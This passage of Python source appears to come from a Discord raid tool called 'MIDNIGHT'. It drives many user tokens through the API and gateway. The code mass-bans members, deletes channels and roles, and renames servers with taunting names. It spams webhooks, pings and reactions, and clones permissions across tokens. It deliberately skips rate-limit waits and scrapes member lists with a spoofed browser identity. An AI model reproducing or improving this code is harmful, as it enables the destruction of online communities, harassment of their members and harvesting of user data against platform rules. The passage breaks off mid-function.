                    if i > 100: self.update_signal.emit(f"[ℹ️] Channel {channel_id} exhausted.")
                    break 

                time.sleep(delay + random.uniform(0.1, 0.3))
            
            if len(self.scraped_members) >= total_target:
                self.update_signal.emit(f"[✅] Exact target reached. Stopping.")
                break

        self.update_signal.emit(f"[⏳] Finalizing scan. Found {len(self.scraped_members)} members.")
        if self.ws: self.ws.close()
        return list(self.scraped_members.values())








    def conditional_sleep(self, duration):
        if not getattr(self, 'bypass_rate_limits', False):
            time.sleep(duration)

    



    def make_request(self, method, endpoint, token, payload=None):
        headers = self.headers_template.copy()
        headers["Authorization"] = token

        for attempt in range(3):
            try:
                if not self.running or not token: return None
                
                r = self.session.request(
                    method=method,
                    url=endpoint,
                    headers=headers,
                    json=payload,
                    timeout=10
                )

                # Handle Dead Tokens
                if self.invalidate_dead_tokens and r.status_code in [401, 403]:
                    # (Keep existing dead token logic here...)
                    cooldown_time = self.dead_token_retry_delay
                    if r.status_code == 401:
                        self.update_signal.emit(f"[❌] Unauthorized (401) with token ...{token[-4:]}. Placing on cooldown.")
                    else: 
                        self.update_signal.emit(f"[⚠️] Forbidden (403) for {endpoint} with token ...{token[-4:]}. Placing on cooldown.")
                    self.token_cooldowns[token] = time.time() + cooldown_time
                    return r 

                if r.status_code == 204:
                    return r
                
                # --- MODIFIED RATE LIMIT HANDLING ---
                if r.status_code == 429:
                    # Check if we should IGNORE the sleep for specific heavy actions
                    # 1. Webhook Creation (POST to /webhooks)
                    # 2. Bans (PUT to /bans)
                    # 3. Channel Creation (POST to /channels)
                    is_ignorable = (
                        ("webhooks" in endpoint and method == "POST") or
                        ("bans" in endpoint and method == "PUT") or
                        ("channels" in endpoint and method == "POST")
                    )

                    if is_ignorable:
                        # Skip the sleep, return the failed response immediately so the bot moves to the next task
                        self.update_signal.emit(f"[⏩] Skipping rate limit wait for {method} {endpoint[-20:]}...")
                        return r

                    # Standard handling for other requests (like messages)
                    try:
                        retry_after = float(r.json().get('retry_after', 1.5))
                    except:
                        retry_after = 1.5

                    bypass = getattr(self, 'bypass_rate_limits', False)
                    sleep_time = 0.1 if bypass else retry_after
                    
                    self.update_signal.emit(f"[⏳] Rate limited. Sleeping {sleep_time}s...")
                    time.sleep(sleep_time)
                    continue
                # ------------------------------------

                elif r.status_code >= 400:
                    # (Keep existing error handling...)
                    if r.status_code != 404: 
                        try: msg = r.json().get('message', r.text[:50])
                        except: msg = "Unknown"
                        self.update_signal.emit(f"[❌] Error {r.status_code}: {msg}")
                    self.conditional_sleep(0.2)
                    return r
                
                return r

            except requests.exceptions.RequestException as e:
                self.update_signal.emit(f"[❌] Connection error: {e}")
                time.sleep(1.0)
            except Exception as e:
                self.update_signal.emit(f"[❌] Unexpected error: {e}")
                time.sleep(1.0)

        return None

    def run_ghost_typer(self):
        """
        Starts a continuous typing indicator in the specified channel using all available tokens.
        """
        if not self.running:
            return

        channel_id = getattr(self, 'channel_id', None)
        if not channel_id:
            self.update_signal.emit("[❌] Ghost Typer failed: No Channel ID was provided.")
            return

        self.update_signal.emit(f"[👻] Ghost Typer started in channel {channel_id} with {len(self.tokens)} token(s).")
        endpoint = f"{self.base_url}/channels/{channel_id}/typing"

        def worker(token):
            """The actual typing loop for a single token."""
            token_short = token[-4:]
            while self.running:
                # The make_request function handles rate limits and retries
                r = self.make_request("POST", endpoint, token)
                if r and r.status_code in [401, 403, 404]:
                    self.update_signal.emit(f"[❌] Ghost Typer (token ...{token_short}) stopped. Error: {r.status_code}. Check token and Channel ID.")
                    break

                # Interruptible sleep for ~8 seconds before the next typing event
                end_time = time.time() + 8
                while self.running and time.time() < end_time:
                    time.sleep(0.1)

        # Create and start a thread for each token
        threads = [threading.Thread(target=worker, args=(token,), daemon=True) for token in self.tokens]
        for t in threads:
            t.start()

        # Wait for all worker threads to complete (which they won't until self.running is False)
        for t in threads:
            t.join()

    def make_persistent_request(self, method, endpoint, token, payload=None):
        headers = self.headers_template.copy()
        headers["Authorization"] = token
        
        while self.running:
            try:
                if not token: # Check if get_next_token returned None
                    token = self.get_next_token()
                    if not token:
                        time.sleep(1)
                        continue

                if method.upper() == "PUT":
                    r = requests.put(endpoint, headers=headers, json=payload, timeout=10)
                else:
                    r = requests.request(method.upper(), endpoint, headers=headers, json=payload, timeout=10)

                if r.status_code in [200, 201, 204]:
                    return r

                if self.invalidate_dead_tokens and r.status_code in [401, 403, 404]:
                    cooldown_time = self.dead_token_retry_delay
                    if r.status_code == 401:
                        self.update_signal.emit(f"[❌] Unauthorized (401) with token ...{token[-4:]}. Placing it on a {cooldown_time}s cooldown.")
                    elif r.status_code == 403:
                         self.update_signal.emit(f"[⚠️] Forbidden (403) with token ...{token[-4:]}. Placing it on a {cooldown_time}s cooldown.")
                    self.token_cooldowns[token] = time.time() + cooldown_time
                    token = None 
                    return r 
                
                if r.status_code == 429:
                    try:
                        data = r.json()
                        retry_after = float(data.get('retry_after', 1.5))
                        scope = "globally" if data.get('global', False) else "on this endpoint"
                        self.update_signal.emit(f"[⏳] Rate limited {scope}. Waiting for {retry_after:.2f}s...")
                        time.sleep(retry_after)
                        continue
                    except (ValueError, json.JSONDecodeError):
                        self.update_signal.emit("[⏳] Rate limited (unparsable response). Waiting for 2s...")
                        time.sleep(2)
                        continue

                self.update_signal.emit(f"[⚠️] Unhandled status {r.status_code} for {endpoint}: {r.text[:100]}")
                return r
            except requests.exceptions.Timeout:
                self.update_signal.emit(f"[❌] Request to {endpoint} timed out. Retrying in 3s...")
                time.sleep(3)
            except requests.exceptions.ConnectionError as e:
                self.update_signal.emit(f"[❌] Connection error to {endpoint}: {e}. Retrying in 5s...")
                time.sleep(5)
            except Exception as e:
                self.update_signal.emit(f"[❌] An unexpected error occurred for {endpoint}: {e}. Retrying in 5s...")
                time.sleep(5)
        return None


    def create_channel(self, token, name="midnight-doom"):
        if not self.running: return None
        server_id = getattr(self, 'server_id', None)
        if not server_id: return None
        payload = {"name": name, "type": 0}
        r = self.make_request("POST",
                              f"{self.base_url}/guilds/{server_id}/channels",
                              token, payload)
        if r and r.status_code in [200, 201]:
            return r.json()['id']
        return None

    def delete_channel(self, token, channel_id):
        if not self.running: return False
        r = self.make_request("DELETE",
                              f"{self.base_url}/channels/{channel_id}",
                              token)
        if r and r.status_code in (200, 204):
            return True
        return False

    def delete_role(self, token, role_id):
        if not self.running: return False
        server_id = getattr(self, 'server_id', None)
        if not server_id: return False
        r = self.make_request("DELETE",
                              f"{self.base_url}/guilds/{server_id}/roles/{role_id}",
                              token)
        if r and r.status_code == 204:
            return True
        return False



    def ban_member(self, token, user_id):
        if not self.running: return False
        server_id = getattr(self, 'server_id', None)
        if not server_id or not user_id: return False
        if getattr(self, 'user_id', None) == user_id: return False

        # Calls the new persistent request function ONLY for banning
        r = self.make_persistent_request("PUT",
                                         f"{self.base_url}/guilds/{server_id}/bans/{user_id}",
                                         token, payload={'delete_message_seconds': 0})

        if r and r.status_code == 204:
            return True
        else:
            error_msg = "a permanent error (for example missing permissions)."
            if r is not None:
                try:
                    error_data = r.json()
                    error_msg = error_data.get('message', f"status code {r.status_code}")
                except (ValueError, json.JSONDecodeError):
                    error_msg = f"status code {r.status_code}"

            self.update_signal.emit(
                f"[❌] Failed to ban user {user_id} due to '{error_msg}'. This user will be skipped.")
            return False

    def _give_best_role_to_tokens(self, executor):
        """
        Private method to create a role with the primary token's permissions
        and assign it to all other tokens. Runs as part of the nuke process.
        """
        if len(self.tokens) < 2:
            self.update_signal.emit("[ℹ️] 'Give best role' action skipped: requires at least two tokens.")
            return

        server_id = getattr(self, 'server_id', None)
        if not server_id:
            self.update_signal.emit("[❌] 'Give best role' action failed: No Server ID context.")
            return

        self.update_signal.emit("[⚖️] Checking permissions for role creation...")
        scan_token = self.tokens[0]

        r_user = self.make_request("GET", f"{self.base_url}/users/@me", scan_token)
        if not r_user or r_user.status_code != 200:
            self.update_signal.emit("[❌] Could not verify primary token. Aborting role creation.")
            return

        my_user_id = r_user.json()['id']
        r_member = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/members/{my_user_id}", scan_token)
        if not r_member or r_member.status_code != 200:
            self.update_signal.emit(f"[❌] Could not fetch your member info for server {server_id}.")
            return

        my_role_ids = set(r_member.json().get('roles', []))
        my_role_ids.add(server_id)  # @everyone

        r_all_roles = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/roles", scan_token)
        if not r_all_roles or r_all_roles.status_code != 200:
            self.update_signal.emit("[❌] Could not fetch server roles to check permissions.")
            return

        all_roles_map = {role['id']: role for role in r_all_roles.json()}
        my_permissions = 0
        for role_id in my_role_ids:
            if role_id in all_roles_map:
                my_permissions |= int(all_roles_map[role_id]['permissions'])

        has_admin_perm = (my_permissions & 0x8) == 0x8
        has_manage_roles_perm = (my_permissions & 0x10000000) == 0x10000000

        if not (has_admin_perm or has_manage_roles_perm):
            self.update_signal.emit("[❌] ACTION FAILED: You lack 'Administrator' or 'Manage Roles' permission.")
            return

        self.update_signal.emit("[✅] Role management permissions confirmed.")

        all_roles = r_all_roles.json()
        my_total_permissions = 0
        my_highest_position = 0
        user_roles = [role for role in all_roles if role['id'] in my_role_ids]

        if user_roles:
            for role in user_roles:
                my_total_permissions |= int(role['permissions'])
            my_highest_position = max(role['position'] for role in user_roles)
            self.update_signal.emit(f"[⚙️] Scanned your permissions to clone.")
        else:
            self.update_signal.emit("[⚠️] You have no roles; the new role will have no permissions.")

        role_name = "Member"
        role_color = random.randint(0, 0xFFFFFF)
        payload = {"name": role_name, "color": role_color, "permissions": str(my_total_permissions), "hoist": True,
                   "mentionable": True}
        r_create = self.make_request("POST", f"{self.base_url}/guilds/{server_id}/roles", scan_token, payload=payload)

        if not r_create or r_create.status_code != 200:
            self.update_signal.emit(f"[❌] Failed to create the '{role_name}' role.")
            return

        new_role = r_create.json()
        new_role_id = new_role['id']
        self.protected_role_id = new_role_id  # Protect this role from the nuke
        self.update_signal.emit(f"[✅] Created role '{role_name}' with your cloned permissions.")

        if my_highest_position > 0:
            move_payload = [{"id": new_role_id, "position": my_highest_position}]
            self.make_request("PATCH", f"{self.base_url}/guilds/{server_id}/roles", scan_token, payload=move_payload)

        other_tokens = self.tokens[1:]
        user_ids_to_add_role = []
        for token in other_tokens:
            if not self.running: break
            r_user_other = self.make_request("GET", f"{self.base_url}/users/@me", token)
            if r_user_other and r_user_other.status_code == 200:
                user_ids_to_add_role.append(r_user_other.json()['id'])

        if not user_ids_to_add_role:
            return

        self.update_signal.emit(f"[✨] Giving role '{role_name}' to {len(user_ids_to_add_role)} other token(s)...")

        def add_role_to_user(user_id):
            endpoint = f"{self.base_url}/guilds/{server_id}/members/{user_id}/roles/{new_role_id}"
            r = self.make_request("PUT", endpoint, scan_token)
            if r and r.status_code == 204:
                self.update_signal.emit(f"[✅] Successfully gave role to user {user_id}")
            else:
                self.update_signal.emit(f"[❌] Failed to give role to user {user_id}.")

        futures = [executor.submit(add_role_to_user, uid) for uid in user_ids_to_add_role]
        for _ in as_completed(futures):
            if not self.running: break
        self.update_signal.emit(f"[✅] Finished assigning roles.")



    def delete_webhook(self, token, webhook_id):
        if not self.running: return False
        r = self.make_request("DELETE",
                              f"{self.base_url}/webhooks/{webhook_id}",
                              token)
        if r and r.status_code == 204:
            return True
        return False

    def send_specific_message(self, token, channel_id, content):
        if not channel_id:
            self.update_signal.emit("[BOT ERROR] Cannot send message: Channel ID is missing.")
            return False
        # Allow sending empty/whitespace messages if intended
        if content is None:
            self.update_signal.emit("[BOT ERROR] Cannot send message: Content is missing.")
            return False

        self.update_signal.emit(f"[BOT ACTION] Trying to send message to channel: {channel_id}")
        r = self.make_request("POST", f"{self.base_url}/channels/{channel_id}/messages", token, {"content": content})

        if r and r.status_code == 200:
            self.update_signal.emit("[BOT SUCCESS] Message sent successfully.")
            return True
        else:
            self.update_signal.emit("[BOT FAILED] Could not send message.")
            return False


    def update_server_details(self, token, new_name="💀 ANNIHILATED BY MIDNIGHT 💀"):
        if not self.running: return False
        server_id = getattr(self, 'server_id', None)
        if not server_id: return False

        payload = {}
        if getattr(self, 'destruction_options', {}).get("rename_server"):
            custom_name = getattr(self, 'custom_server_name', '').strip()
            payload['name'] = custom_name if custom_name else new_name

        server_pfp_path = getattr(self, 'server_pfp_path', None)
        if server_pfp_path and os.path.exists(server_pfp_path):
            try:
                with open(server_pfp_path, "rb") as image_file:
                    encoded_string = base64.b64encode(image_file.read()).decode('utf-8')
                ext = os.path.splitext(server_pfp_path)[1].lstrip('.').lower()
                if ext == 'jpg': ext = 'jpeg'
                payload["icon"] = f"data:image/{ext};base64,{encoded_string}"
            except Exception as e:
                self.update_signal.emit(f"[❌] Failed to set server PFP: {e}")
        elif server_pfp_path:
            self.update_signal.emit(f"[⚠️] PFP path specified, but file not found: {server_pfp_path}")

        if not payload:
            return False

        r = self.make_request("PATCH",
                              f"{self.base_url}/guilds/{server_id}",
                              token, payload)
        if r and r.status_code == 200:
            log_msgs = []
            if 'name' in payload: log_msgs.append(f"Renamed server to: {payload['name']}")
            if 'icon' in payload: log_msgs.append("Set server PFP")
            self.update_signal.emit("[✅] " + ", ".join(log_msgs))
            return True
        else:
            self.update_signal.emit(f"[❌] Failed to update server details.")
            return False



    def send_specific_message(self, token, channel_id, content):
        if not channel_id:
            self.update_signal.emit("[BOT ERROR] Cannot send message: Channel ID is missing.")
            return False
        if not content:
            self.update_signal.emit("[BOT ERROR] Cannot send message: Content is empty.")
            return False

        self.update_signal.emit(f"[BOT ACTION] Trying to send message to channel: {channel_id}")
        r = self.make_request("POST", f"{self.base_url}/channels/{channel_id}/messages", token, {"content": content})

        if r and r.status_code == 200:
            self.update_signal.emit("[BOT SUCCESS] Message sent successfully.")
            return True
        else:
            self.update_signal.emit("[BOT FAILED] Could not send message.")
            return False

    def run_single_action(self):
        if not hasattr(self, 'single_action_details') or not self.single_action_details:
            self.update_signal.emit("[❌] No single action was specified for execution.")
            return

        action_type = self.single_action_details.get("type")
        params = self.single_action_details.get("params", {})
        self.update_signal.emit(f"[▶️] Executing single action: {action_type}")

        success = False
        if action_type == "send_message":
            token = self.get_next_token()
            # The 'message' in params is now correctly just the content after the command
            msg = params.get('message', 'Default message')
            target_channel_id = params.get('channel_id', None)
            if not target_channel_id:
                self.update_signal.emit("[❌] No channel ID provided to send message.")
            else:
                # This now calls the correct, new method
                success = self.send_specific_message(token, target_channel_id, msg)

        elif action_type == "ban_member":
            token = self.get_next_token()
            user_id_to_ban = params.get('replied_user_id')
            target_server_id = params.get('server_id', None)
            # Add the server_id to the bot's attributes for the ban_member function to use
            if target_server_id:
                setattr(self, 'server_id', target_server_id)

            if not target_server_id:
                self.update_signal.emit("[❌] No server ID context for banning.")
            elif not user_id_to_ban:
                self.update_signal.emit("[❌] No user ID to ban. (Hint: Reply to a user's message).")
            else:
                success = self.ban_member(token, user_id_to_ban)

        elif action_type == "rainbow_message":
            self.run_rainbow_message()
            success = True

        elif action_type == "colorswap_message":
            self.run_colorswap_message()
            success = True

        elif action_type == "colorful_swap":
            self.run_colorful_swap_message()
            success = True


        if success:
            self.update_signal.emit(f"[✅] Single action '{action_type}' completed successfully.")
        else:
            self.update_signal.emit(f"[❌] Single action '{action_type}' failed or was not successfully executed.")


    def add_reaction(self, token, channel_id, message_id, emoji):
        if not self.running: return False
        encoded_emoji = requests.utils.quote(emoji.encode('utf-8'))
        r = self.make_request("PUT",
                              f"{self.base_url}/channels/{channel_id}/messages/{message_id}/reactions/{encoded_emoji}/@me",
                              token)
        if r and r.status_code == 204:
            return True
        return False

    def leave_server(self, token, guild_id):
        if not self.running: return False
        r = self.make_request("DELETE", f"{self.base_url}/users/@me/guilds/{guild_id}", token)
        if r and r.status_code == 204:
            self.update_signal.emit(f"[👋] Left server: {guild_id}")
            return True
        return False

    def block_user(self, token, user_id):
        if not self.running: return False
        payload = {"type": 2}
        r = self.make_request("PUT", f"{self.base_url}/users/@me/relationships/{user_id}", token, payload=payload)
        if r and r.status_code == 204:
            self.update_signal.emit(f"[🚫] Blocked user: {user_id}")
            return True
        return False

    def create_role(self, token, name="HACKED", color=0xff0000, permissions="0"):
        if not self.running: return None
        server_id = getattr(self, 'server_id', None)
        if not server_id: return None
        payload = {"name": name, "color": color, "permissions": str(permissions)}
        r = self.make_request("POST", f"{self.base_url}/guilds/{server_id}/roles", token, payload)
        if r and r.status_code == 200:
            return r.json()['id']
        return None

    def create_webhook(self, token, channel_id, name="MIDNIGHT"):
        if not self.running: return None
        payload = {"name": name}
        r = self.make_request("POST", f"{self.base_url}/channels/{channel_id}/webhooks", token, payload)
        if r and r.status_code == 200:
            return r.json()['url']
        return None

    def send_webhook_message(self, webhook_url, content, allowed_mentions={"parse": ["everyone", "roles", "users"]}):
        if not self.running: return False
        try:
            r = requests.post(webhook_url, json={"content": content, "allowed_mentions": allowed_mentions}, timeout=5)
            if r.status_code == 204:
                return True
        except:
            pass
        return False

    def resolve_status_emoji(self, token, text, server_id):
        """
        Parses status text for a custom emoji, resolves its ID, and returns cleaned text.
        Returns: (cleaned_text, emoji_id, emoji_name)
        """
        if not server_id or ':' not in text:
            return text, None, None

        match = re.search(r':([a-zA-Z0-9_~\-]+):', text)
        if not match:
            return text, None, None

        emoji_name_to_find = match.group(1)

        # Check cache first
        if server_id not in self.emoji_cache:
            self.update_signal.emit(f"[⚙️] Fetching emojis for server {server_id} for the first time...")
            r = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/emojis", token)
            if r and r.status_code == 200:
                self.emoji_cache[server_id] = r.json()
            else:
                self.update_signal.emit(f"[⚠️] Could not fetch emojis for server {server_id}. Cannot use custom emoji.")
                self.emoji_cache[server_id] = []  # Cache failure
                return text, None, None

        # Find emoji in cache
        for emoji_data in self.emoji_cache[server_id]:
            if emoji_data['name'] == emoji_name_to_find:
                cleaned_text = text.replace(f":{emoji_name_to_find}:", "").strip()
                emoji_id = emoji_data['id']
                self.update_signal.emit(f"[✨] Found emoji '{emoji_name_to_find}' (ID: {emoji_id}) for status.")
                return cleaned_text, emoji_id, emoji_name_to_find

        self.update_signal.emit(f"[⚠️] Emoji ':{emoji_name_to_find}:' not found on server {server_id}.")
        return text, None, None

    def change_status(self, token, text=None, presence=None):
        if not self.running: return False

        payload = {}  # Start with an empty payload

        if text is not None:
            # This part resolves emojis and creates the custom_status dict
            emoji_server_id = getattr(self, 'status_emoji_server_id', None)
            cleaned_text, emoji_id, emoji_name = self.resolve_status_emoji(token, text, emoji_server_id)

            custom_status_payload = {"text": cleaned_text}
            if emoji_id and emoji_name:
                custom_status_payload["emoji_id"] = emoji_id
                custom_status_payload["emoji_name"] = emoji_name

            payload["custom_status"] = custom_status_payload  # Add to main payload

        if presence:
            # Add presence to the same payload
            payload["status"] = presence

        # If the payload is still empty, there's nothing to do.
        if not payload:
            return False

        # Make the single API request with the combined payload
        r = self.make_request("PATCH", f"{self.base_url}/users/@me/settings", token, payload=payload)

        if r and r.status_code == 200:
            return True
        else:
            self.update_signal.emit(f"[⚠️] Failed to change status.")
            return False

    def send_json_request(self, ws, request):
        if not self.running or not ws or not ws.connected: return
        try:
            ws.send(json.dumps(request))
        except (websocket.WebSocketConnectionClosedException, AttributeError):
            self.update_signal.emit("[⚠️] Gateway connection closed while trying to send request.")
            self.running = False

    def heartbeat(self, interval, ws):
        while self.running:
            time.sleep(interval)
            if not self.running: break
            if ws and ws.connected:
                self.send_json_request(ws, {"op": 1, "d": self.last_sequence})
            else:
                self.update_signal.emit("[⚠️] Heartbeat: WebSocket connection lost.")
                break




    def _find_valid_channel(self, guild_id, token):
        """
        Finds the best channel ID to bind the Opcode 14 request to.
        Prioritizes system/rules channels where member lists are usually open.
        """
        # 1. Try to get 'official' public channels from guild info first
        r_guild = self.make_request("GET", f"{self.base_url}/guilds/{guild_id}", token)
        if r_guild and r_guild.status_code == 200:
            data = r_guild.json()
            # Priority Order: Public Updates -> Rules -> System -> General Text
            candidates = [
                data.get('public_updates_channel_id'),
                data.get('rules_channel_id'),
                data.get('system_channel_id')
            ]
            for c_id in candidates:
                if c_id: return c_id

        # 2. Fallback: Scan all channels for a suitable text channel
        r_channels = self.make_request("GET", f"{self.base_url}/guilds/{guild_id}/channels", token)
        if r_channels and r_channels.status_code == 200:
            channels = r_channels.json()
            
            # Filter for text channels (Type 0) or News (Type 5)
            text_channels = [c for c in channels if c['type'] in [0, 5]]
            
            # Sort by position (usually top channels are general/welcome)
            text_channels.sort(key=lambda x: x.get('position', 0))
            
            for ch in text_channels:
                # If we find one with a common name, take it
                name = ch.get('name', '').lower()
                if any(x in name for x in ['general', 'chat', 'rules', 'welcome', 'announcements', 'verify']):
                    return ch['id']
            
            # If nothing specific found, return the first text channel
            if text_channels:
                return text_channels[0]['id']
                
        return None



    
    def fetch_members_recursive(self, delay=1.0):
        if not self.running: return []
        server_id = getattr(self, 'server_id', None)
        token = self.tokens[0]
        
        # --- LOGIC CHANGE HERE ---
        manual_limit = getattr(self, 'custom_member_limit', 0)
        
        if manual_limit > 0:
            self.target_guild_member_count = manual_limit
            self.update_signal.emit(f"[🎯] Using Manual Goal: {manual_limit} members")
        elif self.target_guild_member_count == 0:
             r_info = self.make_request("GET", f"{self.base_url}/guilds/{server_id}?with_counts=true", token)
             if r_info and r_info.status_code == 200:
                 self.target_guild_member_count = r_info.json().get('member_count', 0)

        target = self.target_guild_member_count
        
        # ... (Rest of connection logic stays same) ...
        if not self.gateway_ready.is_set():
            self.gateway_thread = threading.Thread(target=self.connect_gateway, args=(token, server_id), daemon=True)
            self.gateway_thread.start()
            self.update_signal.emit("[🔍] Connecting to Gateway...")
            if not self.gateway_ready.wait(timeout=10): 
                self.update_signal.emit("[❌] Gateway failed to connect.")
                return []

        import queue
        import string
        
        work_queue = queue.PriorityQueue()
        chars = list(string.ascii_lowercase + string.digits + "_.")
        for c in chars: work_queue.put((1, c)) 
            
        self.update_signal.emit(f"[🚀] Starting Deep Drill. Target: {target}")

        while not work_queue.empty() and self.running:
            # Stop check
            if len(self.scraped_members) >= target and target > 0:
                self.update_signal.emit(f"[✅] Target reached ({len(self.scraped_members)}/{target}). Stopping Drill.")
                break

            try: priority, query = work_queue.get(timeout=1)
            except: break
            
            self.current_nonce = str(random.randint(100000, 999999))
            self.chunk_gathering_event.clear()
            self.temp_chunk_data = []
            
            req = {
                "op": 8,
                "d": {
                    "guild_id": str(server_id), "query": query, "limit": 100, "nonce": self.current_nonce
                }
            }
            self.send_json_request(self.ws, req)
            
            start_wait = time.time()
            got_data = False
            while time.time() - start_wait < 2.0:
                if self.chunk_gathering_event.is_set():
                    got_data = True
                    break
                time.sleep(0.05)
            
            if got_data:
                chunk = self.temp_chunk_data
                found_count = len(chunk)
                new_in_batch = 0
                for m in chunk:
                    u = m.get('user')
                    if u:
                        uid = u.get('id')
                        if uid and uid not in self.scraped_members:
                            self.scraped_members[uid] = {"id": uid, "username": u.get('username'), "discriminator": u.get('discriminator')}
                            new_in_batch += 1

                if found_count >= 100 and len(query) < 4:
                    sub_chars = string.ascii_lowercase + string.digits
                    for char in sub_chars:
                        work_queue.put((len(query) + 1, query + char))
                    if new_in_batch > 0:
                         self.progress_signal.emit(0, f"Drilling '{query}'... (Found +{new_in_batch})")
                else:
                    current = len(self.scraped_members)
                    percent = int((current / target) * 100) if target > 0 else 0
                    if new_in_batch > 0:
                        self.progress_signal.emit(percent, f"Scanned '{query}' | +{new_in_batch} | Total: {current}")

            time.sleep(delay) 

        if self.ws: self.ws.close()
        return list(self.scraped_members.values())








    def connect_gateway(self, token, server_id_for_scan=None):
        try:
            # Using standard JSON encoding
            gateway_url = "wss://gateway.discord.gg/?v=9&encoding=json"
            self.ws = websocket.create_connection(gateway_url)
            
            # Init Zlib (Just in case Discord sends binary)
            buffer = bytearray()
            inflator = zlib.decompressobj()
            
            # Receive Hello
            self.ws.recv() 

            hb_thread = threading.Thread(target=self.heartbeat, args=(41.25, self.ws), daemon=True)
            hb_thread.start()

            # Identify (Standard User Client properties are crucial for Opcode 14)
            payload = {
                "op": 2,
                "d": {
                    "token": token,
                    "capabilities": 16381,
                    "properties": {
                        "os": "Windows",
                        "browser": "Chrome",
                        "device": "",
                        "system_locale": "en-US",
                        "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                        "browser_version": "124.0.0.0",
                        "os_version": "10",
                        "referrer": "",
                        "referring_domain": "",
                        "referrer_current": "",
                        "referring_domain_current": "",
                        "release_channel": "stable",
                        "client_build_number": 289648,
                        "client_event_source": None
                    },
                    "compress": False,
                }
            }
            self.send_json_request(self.ws, payload)

            while self.running:
                try:
                    if not self.ws or not self.ws.connected: break
                    
                    raw_data = self.ws.recv()
                    
                    # Handle Zlib/Binary if sent
                    if isinstance(raw_data, bytes):
                        buffer.extend(raw_data)
                        if len(raw_data) < 4 or raw_data[-4:] != b'\x00\x00\xff\xff': continue
                        message = inflator.decompress(buffer)
                        buffer = bytearray()
                        event = json.loads(message.decode('utf-8'))
                    else:
                        event = json.loads(raw_data)

                    t = event.get('t')
                    d = event.get('d')

                    # IMMEDIATE UNLOCK on READY
                    if t == "READY":
                        self.gateway_ready.set()
                        self.update_signal.emit("[✅] Gateway Connected (READY received).")

                    # --- FIX FOR OPCODE 8 (Search/Legacy) ---
                    elif t == "GUILD_MEMBERS_CHUNK":
                        current_nonce = getattr(self, 'current_nonce', None)
                        if d.get('nonce') == current_nonce:
                            self.temp_chunk_data = d.get('members', [])
                            self.chunk_gathering_event.set()

                    # --- FIX FOR OPCODE 14 (Scraper/Chunks) ---
                    elif t == "GUILD_MEMBER_LIST_UPDATE":
                        # This processes the scroll data
                        self._process_member_list_update(d)
                        # Signal the fetcher loop that data arrived
                        self.chunk_gathering_event.set() 

                except Exception:
                    continue
        except Exception as e:
            self.update_signal.emit(f"[❌] Gateway Error: {e}")
            self.running = False
            self.gateway_ready.set()




    def fetch_all_members_gateway(self):
        if not self.running: return []
        server_id = getattr(self, 'server_id', None)
        if not server_id: return []
        token = self.tokens[0]
        self.gateway_ready.clear()

        self.gateway_thread = threading.Thread(target=self.connect_gateway, args=(token,), daemon=True)
        self.gateway_thread.start()

        self.update_signal.emit("[🔍] Waiting for Gateway connection...")
        self.gateway_ready.wait(timeout=30)

        if not self.gateway_ready.is_set() or not self.running:
            self.update_signal.emit("[❌] Bot failed to connect to Discord Gateway. Check your token.")
            if self.ws: self.ws.close()
            return []

        self.update_signal.emit("[🔍] Fetching all members via Gateway (this may take a while)...")
        self.member_chunks = []
        queries = "abcdefghijklmnopqrstuvwxyz0123456789_!."
        for i, char in enumerate(queries):
            if not self.running: break
            self.chunk_gathering_event.clear()
            self.send_json_request(self.ws, {"op": 8, "d": {"guild_id": server_id, "query": char, "limit": 100}})
            self.chunk_gathering_event.wait(timeout=5.0)
            self.progress_signal.emit(int(((i + 1) / len(queries)) * 100), f"Fetching members [{char}]")
            time.sleep(random.uniform(0.3, 0.6))

        if self.ws:
            self.ws.close()

        unique_members = {member['user']['id']: member for member in self.member_chunks}
        self.update_signal.emit(f"[✅] Found {len(unique_members)} unique members.")
        return [{"id": data['user']['id'], "username": data['user']['username']} for data in unique_members.values()]

    def run(self):
        self.running = True
        try:
            # Add "ghost_typer" to the action map
            action_map = {
                "nuke": self.run_infinite_nuke if getattr(self, 'destruction_options', {}).get(
                    "infinite_loop") else self.run_nuke,
                "nuclear": self.run_infinite_nuclear if getattr(self, 'destruction_options', {}).get(
                    "infinite_loop") else self.run_nuclear,
                "turbo": self.run_turbo,
                "reaction_spammer": self.run_reaction_spammer,
                "status_changer": self.run_status_changer,
                "role_spammer": self.run_role_spammer,
                "webhook_spammer": self.run_webhook_spammer,
                "webhook_spam_existing": self.run_webhook_spam_existing,
                "webhook_create_only": self.run_webhook_creator,
                "create_channels": self.run_create_channels,
                "member_logger": self.run_member_logger,
                "super_scan_members": self.run_super_scan_members,
                "ban_from_log": self.run_ban_from_log,
                "ping_all": self.run_ping_all,
                "send_multiple_messages": self.run_send_multiple_messages,
                "delete_messages": self.run_delete_messages,
                "delete_all_messages": self.run_delete_all_messages,
                "ban_all_server": self.run_ban_all_server,
                "ping_all_server": self.run_ping_all_server,
                "single_action": self.run_single_action,
                "ghost_typer": self.run_ghost_typer,  # NEW
            }
            if self.current_mode in action_map:
                action_map[self.current_mode]()
            else:
                self.update_signal.emit(f"[BOT WARNING] Unknown execution mode: '{self.current_mode}'")
        except Exception as e:
            self.update_signal.emit(f"[❌] CRITICAL ERROR in {self.current_mode}: {str(e)}")
            traceback.print_exc()
        finally:
            self.running = False
            if self.ws and self.ws.connected:
                self.ws.close()
            self.finished.emit(self, self.initiating_button)

    def stop(self):
        self.update_signal.emit(f"[🛑] Stopping {self.current_mode}...")
        self.running = False
        if self.ws and self.ws.connected:
            try:
                self.ws.close()
            except Exception as e:
                self.update_signal.emit(f"Error closing websocket: {e}")

    def delete_message(self, token, channel_id, message_id):
        if not self.running: return False
        r = self.make_request("DELETE",
                              f"{self.base_url}/channels/{channel_id}/messages/{message_id}",
                              token)
        if r and r.status_code == 204:
            return True
        return False

    def _run_purge_logic(self, delete_all_users):
        if not self.running: return

        channel_id = getattr(self, 'channel_id', None)
        command_message_id = getattr(self, 'command_message_id', None)
        delay = getattr(self, 'delete_message_delay', 0.6)

        if not channel_id or not command_message_id:
            self.update_signal.emit("[❌] Purge failed: Missing channel_id or command_message_id from command context.")
            return

        if not self.user_id:
            r = self.make_request("GET", f"{self.base_url}/users/@me", self.tokens[0])
            if not r or r.status_code != 200:
                self.update_signal.emit("[❌] Could not identify user. Cannot delete messages.")
                return
            self.user_id = r.json()['id']

        self.update_signal.emit(
